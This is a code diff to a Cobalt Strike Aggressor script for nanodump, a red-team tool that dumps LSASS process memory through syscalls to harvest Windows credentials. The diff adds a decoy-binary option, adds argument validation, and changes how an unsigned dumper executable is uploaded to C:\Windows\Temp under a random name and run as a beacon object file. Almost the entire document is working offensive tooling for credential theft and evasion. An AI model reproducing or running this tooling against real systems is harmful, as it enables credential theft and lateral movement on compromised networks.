@@ -17,7 +17,7 @@ local('@dictionary $string $min_length $max_length $length');
 beacon_command_register(
 "nanodump",
 "Use syscalls to dump LSASS.",
-"Usage: nanodump [--pid 1234] [--valid] [--write C:\\Windows\\Temp\\doc.docx] [--fork] [--dup] [--getpid] [--seclogon]");
+"Usage: nanodump [--getpid] [--pid 1234] [--valid] [--write C:\\Windows\\Temp\\doc.docx] [--fork] [--dup] [--seclogon]");
 alias nanodump {
     local('$barch $handle $bof $exe $args $pid $cname $dump_name $write_file $use_valid_sig $fork $dup $i $get_pid $use_seclogon $folder $nanodump_binary');
 
@@ -54,6 +54,8 @@ alias nanodump {
         return;
     }
 
+    # by default, don't set any decoy binary
+    $binary_path = "";
     # by default, do not use MalSecLogon
     $use_seclogon = 0;
     # by default, do not get the PID of LSASS
@@ -81,8 +83,13 @@ alias nanodump {
         }
         else if (@_[$i] eq "--pid" || @_[$i] eq "-p")
         {
-            # set the PID of LSASS
             $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --pid value");
+                return;
+            }
+            # set the PID of LSASS
             $pid = @_[$i];
             if(!-isnumber $pid || $pid eq "0")
             {
@@ -92,9 +99,14 @@ alias nanodump {
         }
         else if (@_[$i] eq "--write" || @_[$i] eq "-w")
         {
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --write value");
+                return;
+            }
             # set the path where the minidump will be written to disk
             $write_file = 1;
-            $i++;
             $dump_name = @_[$i];
             if(!lindexOf($dump_name, "\\"))
             {
@@ -122,6 +134,22 @@ alias nanodump {
             # get the PID of LSASS and leave
             $get_pid = 1;
         }
+        else if (@_[$i] eq "--binary" || @_[$i] eq "-b")
+        {
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --binary value");
+                return;
+            }
+            # decoy binary path
+            $binary_path = @_[$i];
+            if(!lindexOf($binary_path, "\\"))
+            {
+                berror($1, "You must provide a full path: " . $binary_path);
+                return;
+            }
+        }
         else if (@_[$i] eq "--help" || @_[$i] eq "-h")
         {
             berror($1, beacon_command_detail("nanodump"));
@@ -134,25 +162,30 @@ alias nanodump {
         }
     }
 
-    if($dup == 1 && $use_seclogon == 1)
+    if($use_seclogon && $dup && strlen($binary_path) == 0)
     {
-        berror($1, "Cannot set both --dup and --seclogon.");
+        berror($1, "If --seclogon and --dup are used, provide a decoy binary with --binary C:\\Windows\\notepad.exe");
         return;
     }
 
-    if($use_seclogon && $write_file == 0)
+    if(strlen($binary_path) > 0 && ($use_seclogon == 0 || $dup == 0))
     {
-        berror($1, "The option --seclogon requires a dump path.");
+        berror($1, "The --binary option can only be used when --seclogon and --dup are used");
         return;
     }
 
-    $nanodump_binary = "";
-    if($use_seclogon)
+    if($use_seclogon && $dup == 0 && $write_file == 0)
+    {
+        berror($1, "The option --seclogon requires a dump path with --write unless --dup is also provided");
+        return;
+    }
+
+    if($use_seclogon && $dup == 0)
     {
         blog($1, "[!] MalLogonSec implementation is unstable, errors are to be expected");
         $folder = "C:\\Windows\\Temp";
-        $nanodump_binary = $folder . "\\" .  generate_rand_string(5, 10) . ".exe";
-        blog($1, "[!] An unsigned nanodump binary will be uploaded to: ". $nanodump_binary);
+        $binary_path = $folder . "\\" .  generate_rand_string(5, 10) . ".exe";
+        blog($1, "[!] An unsigned nanodump binary will be uploaded to: ". $binary_path .". Use --seclogon with --dup to avoid this.");
         # read in the EXE file
         $handle = openf(script_resource("compiled/nanodump." . $barch . ".exe"));
         $exe = readb($handle, -1);
@@ -163,11 +196,11 @@ alias nanodump {
             return;
         }
         # upload the nanodump binary
-        bupload_raw($1, $nanodump_binary, $exe);
+        bupload_raw($1, $binary_path, $exe);
     }
 
     # pack the arguments
-    $args = bof_pack($1, "iziiiiiiz", $pid, $dump_name, $write_file, $use_valid_sig, $fork, $dup, $get_pid, $use_seclogon, $nanodump_binary);
+    $args = bof_pack($1, "iziiiiiiz", $pid, $dump_name, $write_file, $use_valid_sig, $fork, $dup, $get_pid, $use_seclogon, $binary_path);
 
     # run
     btask($1, "Running NanoDump BOF");
